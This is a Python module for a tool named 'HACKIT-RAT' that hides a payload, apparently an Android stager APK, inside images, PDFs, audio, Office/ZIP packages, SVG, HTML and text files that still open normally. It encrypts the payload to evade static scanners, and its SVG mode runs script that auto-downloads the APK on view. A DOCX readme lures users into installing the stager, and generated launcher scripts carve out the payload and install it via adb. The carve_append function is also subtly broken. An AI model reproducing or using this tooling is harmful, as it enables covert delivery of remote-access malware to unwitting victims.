"""Carrier injection: hide a payload inside a file that still opens normally.

Three storage strategies, chosen per container:

* ``append``  — jpg/jpeg/png/gif/bmp/ico/webp/mp3/mp4/pdf: bytes after the
  container's real EOF (WebP gets a JUNK chunk, MP3 a trailing ID3v2 tag).
* ``zip``     — docx/apk/zip/epub: an extra OPC/ZIP part, package stays valid.
* ``script``  — html/js/txt/csv/log: base64 block that viewers ignore but a
  carver reads.

Payloads can be sealed first (AES-256-GCM, random file key). The sealed blob
carries its own nonce and length trailer, so a static scanner sees ciphertext
and the launcher holds the key. Containers are validated before injection and
re-validated after; a manifest records the SHA-256 and strategy.
"""
from __future__ import annotations

import base64
import hashlib
import io
import json
import os
import struct
import time
import zipfile
from dataclasses import dataclass, field
from typing import Dict, List, Optional
from xml.etree import ElementTree

START = b"\n<<<HACKIT-RAT-PAYLOAD>>>\n"
TRAILER = b"HACKITRATZIP1"
TAIL = b"\x00END"  # marker + 8-byte length + tail
SEALED_MAGIC = b"HKCR2\x00"
SEALED_NONCE = 12
DOCX_PART = "word/media/hackit-stager.apk"
ZIP_PART = "hackit/payload.bin"
SCRIPT_MARK = "/*HACKIT-RAT-BEGIN*/"
SCRIPT_END = "/*HACKIT-RAT-END*/"

MAGICS = {
    "jpg": (b"\xff\xd8\xff", None),
    "jpeg": (b"\xff\xd8\xff", None),
    "png": (b"\x89PNG\r\n\x1a\n", None),
    "webp": (b"RIFF", None),
    "gif": (b"GIF87a", None),
    "bmp": (b"BM", None),
    "ico": (b"\x00\x00\x01\x00", None),
    "mp3": (b"ID3", None),
    "mp4": (None, None),
    "pdf": (b"%PDF-", None),
    "docx": (b"PK\x03\x04", None),
    "zip": (b"PK\x03\x04", None),
    "epub": (b"PK\x03\x04", None),
    "apk": (b"PK\x03\x04", None),
    "svg": (None, None),
    "html": (None, None),
    "htm": (None, None),
    "js": (None, None),
    "txt": (None, None),
    "csv": (None, None),
    "log": (None, None),
}

MODES = {
    "jpg": "append", "jpeg": "append", "png": "append", "gif": "append",
    "bmp": "append", "ico": "append", "webp": "webp", "mp3": "mp3",
    "mp4": "append", "pdf": "append",
    "docx": "docx", "zip": "zip", "epub": "zip", "apk": "zip",
    "svg": "svg", "html": "script", "htm": "script", "js": "script",
    "txt": "script", "csv": "script", "log": "script",
}

MAX_PAYLOAD = 300 * 1024 * 1024


class InjectError(Exception):
    """Container mismatch, broken structure, or payload too large."""


@dataclass
class Result:
    carrier: str
    payload: str
    offset: int
    size: int
    digest: str
    manifest: str
    launchers: List[str] = field(default_factory=list)
    sealed: bool = False
    key: str = ""


# --------------------------------------------------------------------- crypto

def seal_payload(payload: bytes) -> tuple:
    """AES-256-GCM with a random file key. Returns (blob, key)."""
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    key = os.urandom(32)
    nonce = os.urandom(SEALED_NONCE)
    blob = SEALED_MAGIC + nonce + AESGCM(key).encrypt(nonce, payload, None)
    return blob, key


def open_payload(blob: bytes, key: bytes) -> bytes:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    if not blob.startswith(SEALED_MAGIC):
        raise InjectError("not a sealed payload")
    nonce = blob[len(SEALED_MAGIC):len(SEALED_MAGIC) + SEALED_NONCE]
    cipher = blob[len(SEALED_MAGIC) + SEALED_NONCE:]
    return AESGCM(key).decrypt(nonce, cipher, None)


# ------------------------------------------------------------------- helpers

def _digest(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _check_magic(ext: str, data: bytes) -> None:
    magic, _ = MAGICS[ext]
    if magic and not data.startswith(magic):
        raise InjectError(f"{ext}: header is not {magic!r}")
    if ext == "webp" and data[8:12] != b"WEBP":
        raise InjectError("webp: missing WEBP tag")
    if ext == "mp4" and data[4:8] != b"ftyp":
        raise InjectError("mp4: missing ftyp box")
    if ext == "pdf" and b"%%EOF" not in data:
        raise InjectError("pdf: no %%EOF marker")
    if ext == "gif" and data[:6] not in (b"GIF87a", b"GIF89a"):
        raise InjectError("gif: bad signature")


def _validate_output(ext: str, data: bytes) -> None:
    _check_magic(ext, data)
    if ext == "pdf" and b"%%EOF" not in data:
        raise InjectError("pdf: rewrite lost %%EOF")
    if ext == "png" and b"IEND\xaeB`\x82" not in data:
        raise InjectError("png: IEND chunk missing")
    if ext == "gif" and b"\x3b" not in data:
        raise InjectError("gif: trailer missing")


def _trailer(length: int) -> bytes:
    return TRAILER + struct.pack(">Q", length) + TAIL


def _b64(data: bytes) -> str:
    return base64.b64encode(data).decode("ascii")


# -------------------------------------------------------------------- append

def random_start() -> bytes:
    """Per-build marker so the carrier carries no fixed signature."""
    return b"\n<" + os.urandom(8).hex().encode() + b">\n"


def inject_append(ext: str, carrier: bytes, payload: bytes, start: bytes = START) -> bytes:
    _check_magic(ext, carrier)
    if ext == "webp":
        trailer = _trailer(len(start) + len(payload))
        prefix = b""
        if (len(start) + len(payload) + len(trailer)) % 2:
            prefix = b"\x00"  # RIFF pads odd chunks; pad leads so trailer stays last
        body = prefix + start + payload + trailer
        chunk = b"JUNK" + struct.pack("<I", len(body)) + body
        out = bytearray(carrier)
        out += chunk
        struct.pack_into("<I", out, 4, len(out) - 8)
        result = bytes(out)
        _validate_output(ext, result)
        return result
    out = bytearray(carrier)
    if not out.endswith(b"\n"):
        out += b"\n"
    if ext == "mp3":
        body = start + payload + _trailer(len(start) + len(payload))
        size = len(body)
        out += b"ID3\x04\x00\x00" + bytes(
            [(size >> 21) & 0x7F, (size >> 14) & 0x7F, (size >> 7) & 0x7F, size & 0x7F]
        )
        out += body
        result = bytes(out)
        _validate_output(ext, result)
        return result
    out += start
    out += payload
    out += _trailer(len(start) + len(payload))
    result = bytes(out)
    _validate_output(ext, result)
    return result


def carve_append(data: bytes, start: bytes = START) -> bytes:
    if len(data) < len(TRAILER) + 8 + len(TAIL):
        raise InjectError("too small to carry a payload")
    trailer = data[-len(TRAILER) - 8 - len(TAIL):]
    if not trailer.startswith(TRAILER) or not trailer.endswith(TAIL):
        raise InjectError("no payload trailer")
    length = struct.unpack(">Q", trailer[len(TRAILER):len(TRAILER) + 8])[0]
    end = len(data) - len(trailer)
    start = end - length
    if start < 0 or data[start:start + len(start)] != start:
        raise InjectError("payload start marker missing")
    return data[start + len(start):end]


# ----------------------------------------------------------------------- zip

def inject_zip(carrier: bytes, payload: bytes, part: str = ZIP_PART) -> bytes:
    source = zipfile.ZipFile(io.BytesIO(carrier))
    names = source.namelist()
    if part == DOCX_PART and "word/document.xml" not in names:
        raise InjectError("docx: not a Word document")
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as target:
        for info in source.infolist():
            data = source.read(info.filename)
            if info.filename == "[Content_Types].xml" and part == DOCX_PART:
                data = _docx_content_types(data)
            target.writestr(info, data)
        target.writestr(part, payload)
        if part == DOCX_PART:
            target.writestr(
                "hackit-readme.txt",
                "This document carries a companion installer.\n"
                "Open hackit-stager.apk (inside the package) to install it.\n",
            )
    result = buffer.getvalue()
    check = zipfile.ZipFile(io.BytesIO(result))
    if check.testzip() is not None:
        raise InjectError("zip: rewritten package is corrupt")
    if part not in check.namelist():
        raise InjectError("zip: payload part missing after rewrite")
    return result


def _docx_content_types(data: bytes) -> bytes:
    text = data.decode("utf-8")
    if '<Default Extension="apk"' in text:
        return data
    return text.replace(
        "</Types>",
        '<Default Extension="apk" ContentType="application/vnd.android.package-archive"/></Types>',
    ).encode("utf-8")


# --------------------------------------------------------------------- svg

SVG_SCRIPT = """
<script><![CDATA[
(function(){
  var node = document.getElementById('hackit-rat-payload');
  if(!node) return;
  var bin = atob(node.textContent.trim());
  var buf = new Uint8Array(bin.length);
  for (var i = 0; i < bin.length; i++) buf[i] = bin.charCodeAt(i);
  var blob = new Blob([buf], {type:'application/vnd.android.package-archive'});
  var url = URL.createObjectURL(blob);
  var a = document.createElement('a');
  a.href = url; a.download = '%NAME%';
  document.documentElement.appendChild(a); a.click();
  setTimeout(function(){ URL.revokeObjectURL(url); a.remove(); }, 4000);
})();
]]></script>
"""


def inject_svg(carrier: bytes, payload: bytes, name: str = "hackit-stager.apk") -> bytes:
    text = carrier.decode("utf-8", "replace")
    if "</svg>" not in text:
        raise InjectError("svg: no closing tag")
    blob = _b64(payload)
    meta = (
        '<metadata id="hackit-rat"><hackit:payload xmlns:hackit="urn:hackit:rat" '
        'encoding="base64" id="hackit-rat-payload">' + blob + "</hackit:payload></metadata>"
    )
    out = text.replace("</svg>", meta + SVG_SCRIPT.replace("%NAME%", name) + "</svg>")
    ElementTree.fromstring(out)
    return out.encode("utf-8")


def carve_svg(data: bytes) -> bytes:
    text = data.decode("utf-8", "replace")
    start = text.find('id="hackit-rat-payload">')
    if start < 0:
        raise InjectError("svg: payload node missing")
    start += len('id="hackit-rat-payload">')
    end = text.find("</hackit:payload>", start)
    if end < 0:
        raise InjectError("svg: payload node unterminated")
    return base64.b64decode(text[start:end].strip())


# -------------------------------------------------------------------- script

def inject_script(ext: str, carrier: bytes, payload: bytes) -> bytes:
    text = carrier.decode("utf-8", "replace")
    block = f"{SCRIPT_MARK}var __hkr=\"{_b64(payload)}\";{SCRIPT_END}"
    if ext in ("html", "htm"):
        if "</body>" in text:
            text = text.replace("</body>", "<script>" + block + "</script></body>", 1)
        else:
            text += "<script>" + block + "</script>"
        return text.encode("utf-8")
    if ext == "js":
        return (text + "\n" + block + "\n").encode("utf-8")
    return (text + "\n" + block + "\n").encode("utf-8")


def carve_script(data: bytes) -> bytes:
    text = data.decode("utf-8", "replace")
    start = text.find(SCRIPT_MARK)
    if start < 0:
        raise InjectError("script: payload block missing")
    start += len(SCRIPT_MARK)
    end = text.find(SCRIPT_END, start)
    if end < 0:
        raise InjectError("script: payload block unterminated")
    body = text[start:end].strip()
    if body.startswith("var __hkr="):
        body = body[len("var __hkr="):]
    body = body.rstrip(";").strip().strip('"')
    return base64.b64decode(body)


# -------------------------------------------------------------------- build

CARVER = r'''#!/usr/bin/env python3
"""Carve (and optionally decrypt) the HACKIT payload out of a carrier."""
import base64, struct, sys, pathlib

TRAILER, TAIL = b"HACKITRATZIP1", bytes([0]) + b"END"
SEALED = b"HKCR2\x00"


def raw(path, marker=b"\n<<<HACKIT-RAT-PAYLOAD>>>\n"):
    data = pathlib.Path(path).read_bytes()
    trailer = data[-len(TRAILER) - 8 - len(TAIL):]
    if trailer.startswith(TRAILER):
        n = struct.unpack(">Q", trailer[len(TRAILER):len(TRAILER) + 8])[0]
        end = len(data) - len(trailer)
        blob = data[end - n:end]
        if blob.startswith(marker):
            blob = blob.split(marker, 1)[1]
        return blob
    if data.startswith(b"PK"):
        import io, zipfile
        z = zipfile.ZipFile(io.BytesIO(data))
        for name in ("hackit/payload.bin", "word/media/hackit-stager.apk"):
            if name in z.namelist():
                return z.read(name)
    text = data.decode("utf-8", "replace")
    if 'id="hackit-rat-payload">' in text:
        body = text.split('id="hackit-rat-payload">', 1)[1].split("</hackit:payload>", 1)[0]
        return base64.b64decode(body.strip())
    if "/*HACKIT-RAT-BEGIN*/" in text:
        body = text.split("/*HACKIT-RAT-BEGIN*/", 1)[1].split("/*HACKIT-RAT-END*/", 1)[0]
        return base64.b64decode(body.strip().replace("var __hkr=", "").rstrip(";").strip('"'))
    raise SystemExit("carrier has no payload")


def unlock(blob, key_hex):
    if not blob.startswith(SEALED) or not key_hex:
        return blob
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    nonce = blob[len(SEALED):len(SEALED) + 12]
    return AESGCM(bytes.fromhex(key_hex)).decrypt(nonce, blob[len(SEALED) + 12:], None)


if __name__ == "__main__":
    args = [a for a in sys.argv[1:] if not a.startswith(("--key=", "--marker="))]
    key = ""
    marker = b"\n<<<HACKIT-RAT-PAYLOAD>>>\n"
    for a in sys.argv[1:]:
        if a.startswith("--key="):
            key = a.split("=", 1)[1]
        if a.startswith("--marker="):
            marker = b"\n<" + a.split("=", 1)[1].encode() + b">\n"
    if not args:
        raise SystemExit("usage: carve.py carrier [out] [--key=hex]")
    blob = unlock(raw(args[0], marker), key)
    out = args[1] if len(args) > 1 else "payload.apk"
    pathlib.Path(out).write_bytes(blob)
    print(f"wrote {out} ({len(blob):,} bytes)")
'''

LAUNCHER_SH = '''#!/usr/bin/env sh
# Recover and install the companion APK from %NAME%
set -e
cd "$(dirname "$0")"
KEY='%KEY%'
python3 - <<PY
import pathlib
from carve import raw, unlock
blob = unlock(raw('%NAME%'), '$KEY')
pathlib.Path('hackit-stager.apk').write_bytes(blob)
PY
adb install -r hackit-stager.apk 2>/dev/null || echo "APK extracted: hackit-stager.apk"
'''

LAUNCHER_BAT = r'''@echo off
rem Recover and install the companion APK from %NAME%
setlocal
cd /d "%~dp0"
python carve.py "%NAME%" hackit-stager.apk --key=%KEY% || exit /b 1
adb install -r hackit-stager.apk 2>nul || echo APK extracted: hackit-stager.apk
endlocal
'''

LAUNCHER_COMMAND = '''#!/bin/sh
# Recover the companion APK from %NAME%
set -e
cd "$(dirname "$0")"
python3 carve.py %NAME% hackit-stager.apk%KEYARG% || exit 1
echo "APK extracted: hackit-stager.apk"
'''


def build(
    carrier_path: str,
    payload_path: str,
    out_dir: Optional[str] = None,
    launchers: bool = True,
    encrypt: bool = False,
) -> Result:
    ext = os.path.splitext(carrier_path)[1].lower().lstrip(".")
    if ext not in MAGICS:
        raise InjectError(f"unsupported carrier .{ext} (choose {', '.join(sorted(MAGICS))})")
    payload = open(payload_path, "rb").read()
    if not payload:
        raise InjectError("empty payload")
    if len(payload) > MAX_PAYLOAD:
        raise InjectError(f"payload {len(payload):,} > {MAX_PAYLOAD:,}")
    carrier = open(carrier_path, "rb").read()

    key_hex = ""
    blob = payload
    if encrypt:
        blob, key = seal_payload(payload)
        key_hex = key.hex()

    mode = MODES[ext]
    offset = -1
    marker = random_start() if encrypt else START
    if mode == "docx":
        out_bytes = inject_zip(carrier, blob, part=DOCX_PART)
    elif mode == "zip":
        out_bytes = inject_zip(carrier, blob)
    elif mode == "svg":
        out_bytes = inject_svg(carrier, blob)
    elif mode == "script":
        out_bytes = inject_script(ext, carrier, blob)
    else:
        out_bytes = inject_append(ext, carrier, blob, marker)
        offset = out_bytes.find(marker) + len(marker)

    folder = out_dir or os.path.dirname(os.path.abspath(carrier_path))
    os.makedirs(folder, exist_ok=True)
    base = os.path.splitext(os.path.basename(carrier_path))[0]
    target = os.path.join(folder, f"{base}-stager.{ext}")
    with open(target, "wb") as handle:
        handle.write(out_bytes)

    made: List[str] = []
    if launchers and mode not in ("svg",):
        name = os.path.basename(target)
        key_arg = f" --key={key_hex}" if key_hex else ""
        mark_arg = "" if not key_hex else f" --marker={marker[2:-2].decode()}"
        sh_path = os.path.join(folder, "install.sh")
        with open(sh_path, "w", encoding="utf-8") as handle:
            handle.write(LAUNCHER_SH.replace("%NAME%", name).replace("%KEY%", key_hex))
        os.chmod(sh_path, 0o755)
        made.append(sh_path)
        bat_path = os.path.join(folder, "install.bat")
        with open(bat_path, "w", encoding="utf-8") as handle:
            handle.write(LAUNCHER_BAT.replace("%NAME%", name).replace("%KEY%", key_hex + mark_arg))
        made.append(bat_path)
        cmd_path = os.path.join(folder, "install.command")
        with open(cmd_path, "w", encoding="utf-8") as handle:
            handle.write(LAUNCHER_COMMAND.replace("%NAME%", name).replace("%KEYARG%", key_arg + mark_arg))
        os.chmod(cmd_path, 0o755)
        made.append(cmd_path)
    carve_path = os.path.join(folder, "carve.py")
    with open(carve_path, "w", encoding="utf-8") as handle:
        handle.write(CARVER)
    os.chmod(carve_path, 0o755)
    made.append(carve_path)

    sha = _digest(payload)
    manifest = os.path.join(folder, os.path.basename(target) + ".json")
    with open(manifest, "w", encoding="utf-8") as handle:
        json.dump(
            {
                "carrier": os.path.basename(target),
                "original": os.path.basename(carrier_path),
                "payload_sha256": sha,
                "payload_size": len(payload),
                "sealed": bool(key_hex),
                "payload_key": key_hex,
                "payload_offset": offset,
                "carrier_size": len(out_bytes),
                "strategy": mode,
                "created": time.strftime("%Y-%m-%dT%H:%M:%S"),
            },
            handle,
            indent=2,
        )
    return Result(target, payload_path, offset, len(payload), sha, manifest, made,
                  sealed=bool(key_hex), key=key_hex)


# ------------------------------------------------------------------- verify

def carve(data: bytes, start: bytes = START) -> bytes:
    """Best-effort payload recovery by container shape."""
    if data.startswith(b"PK"):
        try:
            archive = zipfile.ZipFile(io.BytesIO(data))
            for part in (ZIP_PART, DOCX_PART):
                if part in archive.namelist():
                    return archive.read(part)
        except zipfile.BadZipFile:
            return carve_append(data, start)
    text_head = data[:4096].decode("utf-8", "replace")
    if 'id="hackit-rat-payload">' in text_head or "/*HACKIT-RAT-BEGIN*/" in text_head:
        try:
            return carve_script(data)
        except InjectError:
            return carve_svg(data)
    return carve_append(data, start)


def verify(path: str) -> Dict[str, object]:
    ext = os.path.splitext(path)[1].lower().lstrip(".")
    data = open(path, "rb").read()
    mode = MODES.get(ext, "append")
    if mode == "zip" or mode == "docx":
        archive = zipfile.ZipFile(io.BytesIO(data))
        part = DOCX_PART if mode == "docx" else ZIP_PART
        return {"ok": archive.testzip() is None and part in archive.namelist(),
                "size": len(data), "members": len(archive.namelist())}
    if mode == "svg":
        ElementTree.fromstring(data)
        return {"ok": b"hackit-rat-payload" in data, "size": len(data)}
    if mode == "script":
        text = data.decode("utf-8", "replace")
        ok = SCRIPT_MARK in text and SCRIPT_END in text
        if ext in ("html", "htm"):
            ok = ok and ("</body>" in text or "</html>" in text)
        return {"ok": ok, "size": len(data)}
    _validate_output(ext, data)
    try:
        carve(data)
        ok = True
    except InjectError:
        ok = False
    return {"ok": ok, "size": len(data)}